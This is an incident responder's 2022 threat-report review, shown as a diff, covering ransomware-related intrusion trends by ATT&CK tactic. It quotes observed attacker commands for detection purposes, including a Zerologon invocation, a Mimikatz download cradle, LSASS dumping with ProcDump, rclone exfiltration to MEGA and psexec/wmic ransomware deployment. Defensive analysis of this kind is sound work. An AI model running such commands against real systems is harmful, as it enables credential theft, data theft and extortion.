@@ -1,0 +1,141 @@
+Over the past year, we have observed multiple intrusions with a majority acting as the entry point for data exfiltration and cyber extortion operations.
+Most of our cases that result in public reporting focus on ransomware operations and the malware they leverage to attain access.
+The numbers below do not account for the various RDP brute forces and exploit cases that did not make it to public reporting.
+Similar to 2021, in 2022, a majority of our cases originated from mass email campaigns that aim to spread malware to various organizations.
+However, one of the biggest shifts in this space has been the discontinuance of Macro usage in Word and Excel files due to Microsoft’s decision to disable macros on files downloaded from the internet.
+Threat actors quickly reacted and began shifting to the usage of ISO and ZIP files containing LNK shortcuts to execute initial payloads.
+We have observed a declining usage of Word and Excel files, however, we observed some malware families delivering Word documents weaponized with exploits such as CVE-2022-30190.
+Many malware families that previously relied on macros have begun to migrate over to ISO and ZIP files packaging malicious LNK or script files.
+One of the most notable is Gootloader, which infects users via compromised websites that are infected to boost rankings on search engines via SEO poisoning.
+In addition, this past year we have also observed the exploitation of Microsoft Exchange via ProxyShell and Manage Engine Support Center Plus.
+Finally, we had one case involving the brute force of an internet accessible SQL Server that led to a network compromise.
+Cases with a non-phishing means of initial access, such as exploitation and RDP brute forcing, may not always result in ransomware.
+Such intrusions may have other motivations, including pure data theft, deployment of cryptomining software, jump point for another intrusion, or scams.
+Due to the disproportional amount of phishing cases we reported, the technique associated with “Malicious File – T1204.002” is at the top of the list.
+PowerShell continues to be a favorite among threat actors for its flexibility and ability to stay in memory.
+There are some very common tasks that threat actors have been observed using PowerShell for, however, in general, due to its versatility, PowerShell can be used to achieve many different tasks.
+For this reason, it is important for organizations to ensure they have visibility into how PowerShell is being used in their environment.
+This can be achieved through Endpoint Protection & Response (EDR) solutions or by leveraging a SIEM tool to analyze PowerShell host-related logs, such as those from PowerShell logging events.
+We have observed continued usage of remote services created for the purpose of lateral movement and privilege escalation.
+These services are created to be run once as SYSTEM, and execute the threat actors’ payload.
+This is common among Cobalt Strike lateral movement capabilities.
+However, we have also observed other payloads being run, such as Sysinternals Procdump.
+DLLs are a very common way for threat actors to package their payloads for execution, this includes payloads related to malware such as IcedID, Emotet and Cobalt Strike beacons.
+The two most common ways threat actors execute exports from these DLLs is via rundll32 and regsvr32.
+There are some benefits to separating the persistence we see at the start of an intrusion, and the persistence observed later in the intrusion.
+The early-stage persistence is related to the malware families that facilitate initial access to an environment or exploits the target’s internet facing services.
+Most often, we observe the initial access malware persist on the system via Registry Run Keys or a Scheduled Task and exploitation attempts usually left web shells, which were accessible via the internet.
+Emotet and Ursnif were observed using Run Keys for persistence.
+Emotet was seen copying a DLL into the user’s AppData folder and executing it with rundll32, while Ursnif used a Run Key to execute a PowerShell script via a LNK file.
+IcedID, Qbot, and Gootloader have all been observed making use of Scheduled Tasks to execute their payloads after the main execution of the malware.
+Late stage persistence takes place after the initial compromise and does not have a set time frame.
+While the early stage persistence targets the beachhead of the intrusion, later stage persistence may be present in other areas of the network the threat actor moved to laterally.
+MITRE does not categorize Remote Access Software as a means of persistence, however, this could be a suggested entry as this software has the ability to persist a reboot and allow threat actors to persist in the environment via the startup service it creates (T1569.002).
+The primary objective of a threat actor will always be to get the highest privileges needed to accomplish their goal(s).
+We examined a variety of methods used to achieve this goal.
+These methods range from using legitimate accounts to setting up scheduled tasks and using certain vulnerabilities that, if exploited, could provide the threat actors with privileged permissions.
+We observed the use of known CVEs during our reports in 2022, allowing the various TAs to have privileged access on the compromised machines.
+These vulnerabilities are designated as CVE-2020-1472 (Zerologon) and CVE-2021-44077 (referring to ManageEngine SupportCenter Plus), respectively.
+C:\Windows\system32\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c "taskkill /f /im explorer.exe"
+In order to assist the initial or ongoing execution of malicious code, adversaries may make use of task scheduling features.
+All popular operating systems provide tools for scheduling scripts or programs to run at a given time and date.
+If the appropriate authentication requirements are satisfied, a task can also be scheduled on a remote machine.
+Although, being a privileged user is usually required to accomplish that.
+"schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn juqpxmakfk /tr "regsvr32.exe -s \"C:\Users\REDACTED\ocrafh.html\"" /SC ONCE /Z /ST 14:20 /ET 14:32
+After discovery, defense evasion was the second most prevalent category for a number of techniques reported in 2022.
+Process injection led the way in this category.
+Process injection was used both by initial access malware like Qbot, and as even more commonly observed, used by post-exploitation tools.
+Process injection by Qbot into msra.exe from Qbot Likes to Move It, Move It.
+Sysmon Event ID 8 logs showing Cobalt Strike injection from Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware
+Cobalt Strike injected process using YARA signatures from BumbleBee Zeros in on Meterpreter
+Injected Cobalt Strike from Volatility malfind data from the Quantum Ransomware report.
+After process injection, another notable category is the pair of techniques T1218.010 and T1218.011, the use of Rundll32 and Regsvr32 as some of the favored tools in use by threat actors to execute their payloads.
+Again, like process injection, this can be observed both by initial access malware and later post-exploitation tools.
+For example, we can see Regsvr32 being utilized both in execution of the IcedID malware and later on to execute the ransomware binary from Stolen Images Campaign Ends in Conti Ransomware.
+And in that same case, the scheduled task used Rundll32 to execute the IcedID payload.
+"C:\Users\REDACTED\AppData\Local\{C904416E-A880-3136-ED72-AA63AF7DB1F2}\Gaagsp2.dll",DllMain --ob="CapitalLadder\license.dat"
+As mentioned in the initial access section, we observed the move away from various macro initial access files like Word and Excel and the beginning of utilizing file formats which bypass the Mark-of-the-Web such as ISO, IMG, VHD, etc.
+The Bumblebee malware was a trail blazer in this, three different reports utilized ISO files with LNK and DLL files contained within.
+One of the primary goals of a threat actor is to get privileged credentials.
+We will get deeper into the lsass and kerberoasting approaches later, but for now, we just want to highlight how many different ways there are to acquire administrator credentials.
+The usage of mimikatz and in particular programs like LaZagne, which are used to dump numerous items (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.), are unquestionably among the most common methods.
+Mimikatz
+$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\Users\<redacted>\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>
+LaZagne
+ls.exe all -oN -output C:\Users\REDACTED
+The LSASS process is the number one target for threat actors because it contains various credentials.
+If the compromised account has the required privileges, LSASS can be dumped or accessed using several tools.
+It is easy to see how having the ability to dump the memory contents of this process allows the attacker to obtain the privileged passwords contained inside it.
+While the LSASS process is always the target, threat actors use a variety of tools to get at the credentials within.
+These strategies can range from the use of third-party frameworks like Cobalt Strike (described here), or system utilities like the Task Manager, to administrative tools like Sysinternals ProcDump.
+The report “BumbleBee Zeros in on Meterpreter” contains an example of utilizing ProcDump for LSASS dump:
+procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp
+The use of a framework such as Cobalt Strike may be noticed inside the “Dead or Alive an Emotet story” report:
+C:\Windows\SYSTEM32\ntdll.dll+9d1e4|C:\Windows\System32\KERNELBASE.dll+2bcbe|C:\Program Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+10369|C:\Program Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+10b65|C:\Program Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+8cb2|C:\Program Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+53c9|C:\Windows\System32\KERNEL32.DLL+17034|C:\Windows\SYSTEM32\ntdll.dll+52651
+The Kerberoasting technique can be used to target and crack weak passwords of service accounts.
+Threat actors utilize a valid Kerberos ticket-granting ticket (TGT) to request a valid ticket-granting service (TGS) ticket.
+With this ticket the threat actors can try various offline brute forcing tools to crack the service account password.
+If cracked, these service accounts may have more privileged access allowing the threat actors to escalate their privileges in an enterprise network.
+In this specific instance, we can see how the PowerSploit framework’s Invoke-Kerberoast utility is being used.
+Upon initial access, threat actors use discovery techniques to gain an understanding of the environment in which they have accessed.
+This can include gathering information on the network, running scans, and enumerating users and groups.
+The information below will focus on some of the most notable tools and commands we observed from our intrusions this past year.
+Looking at the data we have collected for the past year, it is clear that the most commonly used commands are the ones that leverage Windows binaries to gather information about the host and network, such as IP addresses, active connections, and system-related information.
+Some commands, like the net and nltest, are used to collect information on network resources accessible from the compromised host.
+The reason behind the high count of these commands is that they are run by both Hands-On-Keyboard operators and as part of automated execution by malware upon the initial infection.
+An exception to the above is AdFind, which is a command-line Active Directory query tool that we’ve seen over the years.
+Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shares.txt"
+RDP and SMB/Windows Admin Shares top the list around 41% each.
+It is not surprising that attackers prefer the interactive graphics interface RDP provides.
+Such access allows them to search for sensitive documents or any other information without setting off any alerts.
+We can see from the cases, particularly those involving Cobalt Strike, that threat actors use a reverse proxy to tunnel their connections through the C2 server.
+More information about this technique can be found in our second report on Cobalt Strike, “Cobalt Strike, a Defender’s Guide – Part 2”.
+When a connection is established, event ID 4624 LogonType 10 of the security event log can provide us with the name of the remote host that initiated the connection.
+This same data can show up in other logs like Event ID 4778 under Security as observed from Quantum Ransomware.
+Threat actors then use the beachhead host to RDP to other hosts in the environment, assuming they have obtained the necessary access.
+SMB access remains one of the most reliable methods to achieve execution on the remote host.
+We have seen a combination of ways malicious operators copy a tool over to the remote host and then use Cobalt Strike to run it.
+The tools they transfer to the remote hosts range from remote administration tools, such as Atera agent, to Cobalt Strike beacons and ransomware payloads.
+We saw the threat actors create and run a beacon DLL on the target host.
+The execution was via Cobalt Strike and was initiated by the beachhead host.
+C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA
+According to our data, other methods such as Windows Remote Management, pass-the-hash and remote service creation were used, but less frequently compared to the previous techniques.
+This is most often observed in logs via the threat actors’ removal of the temporary location of the export of the infected users inbox.
+In a majority of our cases threat actors performed actions related to network shares however, many times these actions focused on simply finding the data and exfiltrating it.
+Although, in two reports last year we observed threat actors manually reviewing share data while still in the network, allowing a defender to see what data was accessed by the threat actors.
+We also observed at least one threat actor utilize archive utilities before exfiltrating data, as seen in this LSASS dump.
+C:\Program Files\Windows Mail\wabmig.exe
+C:\Windows\system32\cmd.exe /C copy \\<REMOTE_WORKSTATION>\C$\ProgramData\lsass.dmp c:\programdata\lsass.dmp
+C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp
+Intrusions overwhelmingly favored two MITRE techniques, T1071.001 Web Protocols and T1219 Remote Access Tools.
+Looking a little closer at the tools used, there was a pretty even split with Initial Access Broker (IAB) malware, Red Team or Offensive Security Tools (OST), and Remote Access Software.
+For remote access tools used as a means of C2, Anydesk topped the statistics.
+While most remote access tools utilize TLS/SSL, data can still be found to inform use in the environment.
+Anydesk, for instance leaves logs in the user’s AppData and C:\ProgramData that can inform threat actor usage.
+Like in Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware you can locate the login IP of the threat actor utilizing the Anydesk tool.
+In this same case, we saw not just one, but multiple remote access tools with TacticalRMM/MeshCentral being used in tandem with Anydesk.
+From a network monitoring perspective, we can see this type of activity by reviewing dns and TLS/SSL data, like this example from Stolen Images Campaign Ends in Conti Ransomware where the many DNS connections from the Splashtop Streamer tool would be easily detected in network traffic or DNS logs.
+In Dead or Alive? An Emotet Story , the threat actor first created a copy of the relevant files before uploading them to MEGA.
+An example is given below:
+rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4
+As seen in the Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware report, we can see how the threat actor used Rclone and MEGA:
+rclone.exe  copy "\\SERVER.domain.name\path" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+rclone.exe  copy "\\SERVER.domain.name\path" mega:2 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+We were able to draw attention to the attacker’s skill in creating a .zip file containing LSASS in the PHOSPHORUS Automates Initial Access Using ProxyShell report so that it could be exfiltrated and processed (presumably) offline.
+In this instance, a web shell was used to carry out the exfiltration.
+As threat actors are not always successful in completing their objectives, it can result in our data set having visibility gaps for the Impact tactic.
+This may be caused by various reasons, the threat actors may be evicted, the environment may not align with their goals, they may be unable to escalate to a high enough privilege to complete their objective or the threat actors stole data but did not encrypt the environment.
+That being said our data set still has Data Encrypted for Impact – T1486 as the most common impact technique.
+psexec.exe \\<IP ADDRESS> -u <DOMAIN>\Administrator -p "<PASSWORD>" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\ttsel.exe
+wmic /node:"<IP ADDRESS>" /user:"<DOMAIN>\Administrator" /password:"<PASSWORD>" process call create "cmd.exe /c c:\windows\temp\ttsel.exe"
+rundll32.exe locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$
+/TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$
+/login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall
+Over 2022, we continued to see strong usage of initial access brokers and botnet malware.
+We saw the passing of Trickbot and not long afterward BazaarBackdoor too.
+However, Emotet revived for several campaigns (1)(2) despite the public round up of many of the members of the group and seizure of infrastructure in 2021.
+Several other malware families continued to work filling the gaps with both Qbot, IcedID, and BumbleBee topping our data.
+One other trend that may cover several categories including command and control and persistence was the rise in use of legitimate remote access tools.
+In our reports we saw Anydesk, Atera/Splashtop, and TacticalRMM, but expectations should not be limited to just these tools.
+Any legitimate remote access software is likely to see threat actor usage as these offer persistent access to a system or network that won’t be flagged as malicious.
+Many organizations have loose or no controls around what remote access tools are allowed for use, and many vendors only offer support by relying on the user to install their preferred remote access software.
